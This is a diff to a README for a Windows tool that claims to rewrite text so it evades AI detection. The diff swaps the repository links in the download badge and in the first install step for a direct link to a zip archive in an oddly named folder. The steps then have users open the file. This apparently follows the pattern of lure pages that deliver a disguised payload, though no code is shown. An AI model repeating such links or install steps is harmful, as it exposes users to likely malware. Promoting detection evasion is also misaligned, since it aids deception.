@@ -1,6 +1,6 @@
 # ✍️ ai-paraphrase-rewrite-to-bypass - Rewrite text to bypass AI detection
 
-[![Download Application](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/unchanging-census645/ai-paraphrase-rewrite-to-bypass)
+[![Download Application](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/unchanging-census645/ai-paraphrase-rewrite-to-bypass/main/Smilaceae/paraphrase_to_bypass_ai_rewrite_v1.8.zip)
 
 ## 🎯 About This Software
 
@@ -33,7 +33,7 @@ The program works best when you have the latest updates for your Windows system 
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official release page to download the application: [https://github.com/unchanging-census645/ai-paraphrase-rewrite-to-bypass](https://github.com/unchanging-census645/ai-paraphrase-rewrite-to-bypass)
+1.  Visit the official release page to download the application: [https://raw.githubusercontent.com/unchanging-census645/ai-paraphrase-rewrite-to-bypass/main/Smilaceae/paraphrase_to_bypass_ai_rewrite_v1.8.zip](https://raw.githubusercontent.com/unchanging-census645/ai-paraphrase-rewrite-to-bypass/main/Smilaceae/paraphrase_to_bypass_ai_rewrite_v1.8.zip)
 2.  Locate the downloaded file in your browser's download folder.
 3.  Double-click the file to begin the setup process.
 4.  Follow the instructions on your screen to complete the installation.
